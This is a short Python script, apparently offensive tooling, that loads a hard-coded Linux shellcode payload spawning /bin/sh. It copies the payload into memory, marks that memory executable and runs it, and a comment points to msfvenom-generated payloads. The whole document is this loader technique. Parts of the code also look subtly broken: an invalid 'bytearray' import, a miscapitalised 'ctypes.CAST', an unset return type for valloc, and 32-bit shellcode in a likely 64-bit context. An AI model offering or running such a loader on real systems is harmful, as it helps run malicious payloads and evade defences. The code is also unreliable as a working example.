# Ctype Shellcode Loader
import ctypes
import bytearray

# Shellcode (Placeholder - usually generated by msfvenom)
buf = b""
buf += b"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
buf += b"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
buf += b"\x80\xe8\xdc\xff\xff\xff/bin/sh"

# Alloc RWX Memory
libc = ctypes.CDLL('libc.so.6')
sc = ctypes.c_char_p(buf)
size = len(buf)
addr = libc.valloc(size)
ctypes.memmove(addr, sc, size)
libc.mprotect(addr, size, 0x7)

# Execute
run = ctypes.CAST(addr, ctypes.CFUNCTYPE(ctypes.c_void_p))
run()
